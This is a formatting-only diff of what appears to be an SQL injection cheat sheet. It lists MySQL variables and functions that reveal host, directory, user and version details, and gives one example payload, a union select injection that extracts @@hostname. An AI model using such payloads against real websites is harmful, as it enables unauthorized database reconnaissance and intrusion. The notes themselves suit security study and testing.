@@ -57,34 +57,29 @@ IF the developer only allow one row
 
 MySQL database schema
 
-
-
 ```text
-Variable/Function		Output
-@@hostname	:	Current Hostname
-@@tmpdir	:	Tept Directory
-@@datadir	:	Data Directory
-@@version	:	Version of DB
-@@basedir	:	Base Directory
-user()	:	Current User
-database()	:	Current Database
-version()	:	Version
-schema()	:	current Database
-UUID()	:	System UUID key
-current_user()	:	Current User
-current_user	:	Current User
-system_user()	:	Current Sustem user
-session_user()	:	Session user
-@@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
-@@GLOBAL.have_ssl	:	Check if it have ssl or not
+Variable/Function        Output
+@@hostname    :    Current Hostname
+@@tmpdir    :    Tept Directory
+@@datadir    :    Data Directory
+@@version    :    Version of DB
+@@basedir    :    Base Directory
+user()    :    Current User
+database()    :    Current Database
+version()    :    Version
+schema()    :    current Database
+UUID()    :    System UUID key
+current_user()    :    Current User
+current_user    :    Current User
+system_user()    :    Current Sustem user
+session_user()    :    Session user
+@@GLOBAL.have_symlink    :    Check if Symlink Enabled or Disabled
+@@GLOBAL.have_ssl    :    Check if it have ssl or not
 ```
 
-
-Can use follow query to display (Example)
+Can use follow query to display \(Example\)
 
 ```text
 ' & 1 union select 1,@@hostname,3;#
 ```
-
-
 
